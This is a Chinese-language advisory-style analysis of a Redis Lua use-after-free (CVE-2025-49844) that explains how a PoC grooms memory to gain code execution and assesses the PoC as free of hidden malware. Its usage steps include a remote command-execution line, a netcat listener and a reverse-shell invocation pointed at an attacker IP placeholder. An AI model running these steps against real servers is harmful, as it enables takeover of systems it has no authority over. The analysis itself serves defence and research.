## CVE-2025-49844 - Redis Use-After-Free (UAF) / 远程代码执行 (RCE)

**漏洞编号:** CVE-2025-49844

**漏洞类型:** Use-After-Free (UAF) / 远程代码执行 (RCE)

**影响应用:** Redis

**危害等级:** 严重 (Critical)

**CVSS评分:** 10.0

**影响版本:** 所有 Redis 版本在以下补丁版本之前受影响: Redis < 6.2.20, 以及所有 7.x, 8.x 系列版本在各自补丁更新之前。POC 已在 Redis 8.2.1 (alpine/bookworm Docker images) 上验证。

**利用条件:** 需要认证 (Authenticated access required), 低权限用户即可利用

**POC 可用性:** 9/10

**POC 类型:** 完整利用 (Full exploitation)

**攻击复杂度:** 中 (Medium)

**投毒风险:** 0%

## 详情

**POC有效性分析**
CVE-2025-49844，又被称为 RediShell，是 Redis 内存数据结构存储系统中发现的一处重大远程代码执行（RCE）漏洞，其 CVSS 评分高达 10.0，属于最高严重级别。该漏洞的核心在于 Redis 的 Lua 引擎中存在一个 Use-After-Free (UAF) 缺陷，允许经过认证的低权限攻击者通过精心构造的 Lua 脚本来操控垃圾回收机制，触发已释放内存的重用，最终实现任意代码执行。

此 POC 项目由安全研究员 saneki 开发，包含了 `README.md`、`demonstration.py` 和 `pyproject.toml` 等关键文件，提供了对该漏洞的完整验证和利用能力。`README.md` 清晰地阐述了 POC 的目的和用法，明确指出其已在 `redis:8.2.1-alpine` 和 `redis:8.2.1-bookworm` Docker 镜像上成功测试，这表明其针对特定 Redis 版本和环境具有较高的可靠性和有效性。POC 提供两种主要的利用方式：执行单行 Shell 命令，以及建立反向 Shell，从而完全控制受感染的 Redis 服务器。

`demonstration.py` 文件是触发 UAF 漏洞的核心机制。该脚本通过一个名为 `myloader` 的 Lua 函数来精心编排内存操作和垃圾回收：
1.  **触发可回收状态**: `myloader` 函数首次被调用时返回 `nil`。在 Lua 内部，当解析器 `f_parser` 尝试通过 `luaZ_lookahead` 填充 ZIO 缓冲区但遇到 `nil` 时，它会尝试在 `luaX_setinput` 中再次填充缓冲区。此时，用于存储 Lua 脚本块名称（`chunkname`）的内存对象会被标记为可回收状态，但尚未真正释放。
2.  **强制垃圾回收与堆喷**: 第二次调用 `myloader` 时，脚本通过 `collectgarbage("collect")` 强制执行 Lua 的垃圾回收机制。在垃圾回收过程中，之前被标记为可回收的 `chunkname` 内存区域可能会被释放。紧接着，`get_smallstrs(2)` 函数被调用，它会生成并加载两个小的 Lua 字符串。这些小字符串的内存分配请求，在特定的堆布局下，可能恰好重用先前被释放的 `chunkname` 内存区域，实现了堆喷（Heap Grooming）的效果。
3.  **RCE 触发**: 一旦 `chunkname` 的内存被成功重用并覆盖，POC 会将 `return __redis__err__handler().source` 这段精心构造的 Lua 代码写入到该重用的内存区域。当 Redis 服务器后续尝试处理与 Lua 脚本相关的错误时，它可能会尝试执行 `chunkname` 所指向的内容。由于 `chunkname` 已被攻击者控制的指令覆盖，这将导致服务器执行任意代码，最终实现远程代码执行。

`pyproject.toml` 文件中列出的依赖项，如 `redis` 用于与服务器交互，以及 `hexdump` 和 `iced-x86`，进一步证实了这是一个涉及低级别内存操作和二进制分析的复杂漏洞。这些工具通常用于精确地控制内存布局和验证代码执行，从而确保 UAF 漏洞利用的成功率。POC 的输出信息，例如“Replaced chunkname: ...”，明确显示了其成功地用控制数据覆盖了关键的内存区域，证明了其有效性。

**利用步骤**
1.  **环境搭建**: 确保目标 Redis 服务器是受影响版本（例如 Redis 8.2.1 的 Docker 镜像），并且攻击者已获得低权限的 Redis 认证凭据。
2.  **POC获取与依赖安装**: 下载此 POC 代码。在本地开发环境中，使用 Python 包管理器（如 `pip` 或 `uv`）安装 `pyproject.toml` 中列出的所有依赖项，例如运行 `uv sync`。
3.  **执行 Shell 命令**: 
    *   通过命令行执行远程 Shell 命令，例如将 “hello world” 写入目标服务器的 `/data/hello.txt` 文件：
        ```sh
        $ uv run cve-2025-49844 command "echo 'hello world' > /data/hello.txt"
        ```
        (请注意，实际使用时可能需要根据 POC 的具体实现，通过命令行参数指定目标 Redis 服务器的 IP 地址、端口和认证密码。)
4.  **建立反向 Shell**: 
    *   在攻击者的控制机器上，启动一个网络监听器，例如使用 `netcat` 命令 `nc -lvnp 4444` 监听 4444 端口。
    *   执行 POC 以连接反向 Shell 到攻击者的监听器：
        ```sh
        $ uv run cve-2025-49844 rshell -l <攻击者IP地址> -p 4444
        ```
        (将 `<攻击者IP地址>` 替换为实际监听器的 IP 地址。)

**投毒风险分析**
此 POC 代码的投毒风险评估为极低，为 0%。经过对提供的源代码和项目配置文件的仔细审查，未发现任何可疑或恶意的行为。

1.  **代码透明度与可读性**: POC 的所有代码，包括 Python 脚本和内嵌的 Lua 脚本，均以明文形式提供，结构清晰，可读性高。代码中没有任何混淆、加密或二进制打包，使得安全研究人员可以轻松地进行审计和分析，验证其功能是否与声称的一致。
2.  **依赖管理与安全性**: `pyproject.toml` 文件明确列出了所有项目依赖，它们均为 Python 生态系统中广泛使用的、受信任的开源库（如 `redis`、`hexdump`、`iced-x86`）。这些库在安全社区中具有良好的声誉，并且通常由大量用户和维护者进行审查。POC 未引入任何未知来源、未经审核或存在潜在风险的第三方脚本或二进制文件。
3.  **行为边界明确**: POC 的设计目标是演示和利用 CVE-2025-49844 漏洞，其所有“攻击性”操作均明确指向作为目标受害者的 Redis 服务器。这包括发送特定的 Lua 脚本、触发 UAF 缺陷，以及在目标服务器上执行任意代码或建立反向 Shell。这些行为是漏洞利用的预期结果，而非 POC 本身对运行该 POC 的本地主机进行未经授权的修改或攻击。代码中没有检测到任何针对本地文件系统、本地网络环境、注册表或其他本地资源的恶意操作。
4.  **无隐藏恶意负载**: 代码中没有迹象表明存在试图下载或执行外部恶意负载、窃取本地敏感信息、进行加密货币挖矿、植入后门或执行其他任何超出漏洞演示范围的未经授权行为。没有发现可疑的外部网络连接尝试，也没有使用 `eval()`、`exec()` 等可能被滥用执行动态恶意代码的函数，除非是与 Redis 交互的预期部分。
5.  **POC的目的是RCE**: POC演示的就是远程代码执行，这意味着它会向目标服务器发送一段可以执行任意指令的脚本。这正是漏洞的危害所在。但这个“执行任意指令”是针对**目标系统**，而不是指POC代码本身会执行额外的、与漏洞利用无关的恶意指令到**运行POC的机器**上。

综上所述，此 POC 是一个合法且专业的安全研究工具，其目的是帮助组织理解和防御 CVE-2025-49844 漏洞。它不包含任何额外的“投毒”机制，用户可以放心地在受控环境中进行测试和分析，以评估其 Redis 系统的安全防护能力。

**项目地址:** 未提供 (Provided as local files)

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-49844
